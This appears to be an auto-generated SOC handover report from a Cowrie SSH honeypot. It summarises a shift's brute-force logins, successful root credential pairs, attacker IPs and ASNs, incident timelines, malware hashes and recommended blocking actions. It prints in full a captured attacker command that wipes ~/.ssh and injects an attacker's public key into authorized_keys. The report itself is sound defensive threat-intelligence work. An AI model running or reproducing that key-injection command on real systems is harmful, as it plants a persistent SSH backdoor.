# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-23 |
| **Generated At** | 2026-03-23T08:52:51Z |
| **Shift Time** | 08:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **40** |
| False Positives Filtered | **29** (42.0%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **13** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **23** |
| Unique Passwords | **22** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `ovh` | 2 |
| `anders` | 2 |
| `local` | 1 |
| `devops` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 6 |
| `anders` | 2 |
| `12345678` | 2 |
| `7777777` | 2 |
| `localpassword` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `ovh` | `123` | 2 |
| `anders` | `anders` | 2 |
| `root` | `7777777` | 2 |
| `local` | `localpassword` | 1 |
| `devops` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `103.121.91.144` | 2026-03-23T07:21:59 |
| `root` | `q1w2e3r4` | `221.120.4.61` | 2026-03-23T07:33:32 |
| `root` | `Aa123321!` | `118.193.36.245` | 2026-03-23T08:24:23 |
| `root` | `3245gs5662d34` | `118.193.36.245` | 2026-03-23T08:24:26 |
| `root` | `7777777` | `180.166.162.78` | 2026-03-23T08:28:32 |
| `root` | `7777777` | `102.90.34.90` | 2026-03-23T08:28:46 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.193.36.245`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **20** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS212512` | Detai Prosperous Technologies Limited | 1 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 1 | HIGH |
| `AS19318` | Interserver, Inc | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | MEDIUM |
| `AS137693` | CHINATELECOM Guangxi Nanning IDC network | 1 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1d90b45b5be7

| Field | Detail |
|---|---|
| **Source IP** | `103.121.91[.]144` |
| **First Seen** | 2026-03-23 07:21 |
| **Last Seen** | 2026-03-23 07:22 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 07:21:58` | `cowrie.session.connect` |
| `2026-03-23 07:21:58` | `cowrie.client.version` |
| `2026-03-23 07:21:58` | `cowrie.client.kex` |
| `2026-03-23 07:21:59` | `cowrie.login.success` |
| `2026-03-23 07:22:37` | `cowrie.session.file_upload` |
| `2026-03-23 07:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.91[.]144` to AbuseIPDB if not already reported
- [ ] Block `103.121.91[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8ca19f370a

| Field | Detail |
|---|---|
| **Source IP** | `221.120.4[.]61` |
| **First Seen** | 2026-03-23 07:33 |
| **Last Seen** | 2026-03-23 07:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 07:33:29` | `cowrie.session.connect` |
| `2026-03-23 07:33:29` | `cowrie.client.version` |
| `2026-03-23 07:33:29` | `cowrie.client.kex` |
| `2026-03-23 07:33:32` | `cowrie.login.success` |
| `2026-03-23 07:33:32` | `cowrie.direct-tcpip.request` |
| `2026-03-23 07:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.4[.]61` to AbuseIPDB if not already reported
- [ ] Block `221.120.4[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32416d51b88

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-23 08:24 |
| **Last Seen** | 2026-03-23 08:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 08:24:22` | `cowrie.session.connect` |
| `2026-03-23 08:24:22` | `cowrie.client.version` |
| `2026-03-23 08:24:22` | `cowrie.client.kex` |
| `2026-03-23 08:24:23` | `cowrie.login.success` |
| `2026-03-23 08:24:23` | `cowrie.session.params` |
| `2026-03-23 08:24:23` | `cowrie.command.input` |
| `2026-03-23 08:24:23` | `cowrie.command.failed` |
| `2026-03-23 08:24:23` | `cowrie.log.closed` |
| `2026-03-23 08:24:23` | `cowrie.session.params` |
| `2026-03-23 08:24:23` | `cowrie.command.input` |
| `2026-03-23 08:24:23` | `cowrie.session.file_download` |
| `2026-03-23 08:24:23` | `cowrie.log.closed` |
| `2026-03-23 08:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d7af2a621e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-23 08:24 |
| **Last Seen** | 2026-03-23 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 08:24:25` | `cowrie.session.connect` |
| `2026-03-23 08:24:25` | `cowrie.client.version` |
| `2026-03-23 08:24:25` | `cowrie.client.kex` |
| `2026-03-23 08:24:26` | `cowrie.login.success` |
| `2026-03-23 08:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ffa41c86cb

| Field | Detail |
|---|---|
| **Source IP** | `180.166.162[.]78` |
| **First Seen** | 2026-03-23 08:28 |
| **Last Seen** | 2026-03-23 08:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 08:28:30` | `cowrie.session.connect` |
| `2026-03-23 08:28:30` | `cowrie.client.version` |
| `2026-03-23 08:28:30` | `cowrie.client.kex` |
| `2026-03-23 08:28:32` | `cowrie.login.success` |
| `2026-03-23 08:28:33` | `cowrie.direct-tcpip.request` |
| `2026-03-23 08:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.166.162[.]78` to AbuseIPDB if not already reported
- [ ] Block `180.166.162[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc9e928d23a

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-03-23 08:28 |
| **Last Seen** | 2026-03-23 08:33 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 08:28:43` | `cowrie.session.connect` |
| `2026-03-23 08:28:44` | `cowrie.client.version` |
| `2026-03-23 08:28:44` | `cowrie.client.kex` |
| `2026-03-23 08:28:46` | `cowrie.login.success` |
| `2026-03-23 08:28:47` | `cowrie.direct-tcpip.request` |
| `2026-03-23 08:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `118.193.36[.]245` | **10** | 2026-03-23 08:19 | 2026-03-23 08:39 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.138.194[.]82` | **10** | 2026-03-23 07:22 | 2026-03-23 07:48 | 12m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.141[.]117` | **4** | 2026-03-23 08:43 | 2026-03-23 08:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `144.91.85[.]8` | **2** | 2026-03-23 07:10 | 2026-03-23 07:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `58.229.141[.]26` | **2** | 2026-03-23 07:26 | 2026-03-23 07:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]57` | 1 | 2026-03-23 07:43 | 2026-03-23 07:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.145[.]212` | 1 | 2026-03-23 07:08 | 2026-03-23 07:09 | 61s | 0 | `T1592` | 🟢 LOW |
| `219.147.196[.]170` | 1 | 2026-03-23 08:07 | 2026-03-23 08:07 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.159.21[.]170` | 1 | 2026-03-23 07:15 | 2026-03-23 07:17 | 94s | 0 | `T1592` | 🟢 LOW |
| `65.20.233[.]110` | 1 | 2026-03-23 07:51 | 2026-03-23 07:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.169.108[.]199` | 1 | 2026-03-23 08:18 | 2026-03-23 08:18 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.120.4[.]61` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 13 |
| `102.90.34[.]90` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `178.178.222[.]57` | RU | PJSC MegaFon | **100** ⚠️ | 17 |
| `69.169.108[.]199` | US | Interserver, Inc | **100** ⚠️ | 0 |
| `180.166.162[.]78` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 49 |
| `65.20.233[.]110` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 30 |
| `180.138.194[.]82` | CN | CHINANET GUANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `144.91.85[.]8` | FR | Contabo GmbH | **100** ⚠️ | 7 |
| `219.147.196[.]170` | CN | CHINANET HEILONGJIANG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `180.184.141[.]117` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 39 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 21 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (42.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 11 recon entry/entries in table (5 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-23T08:52:51Z_
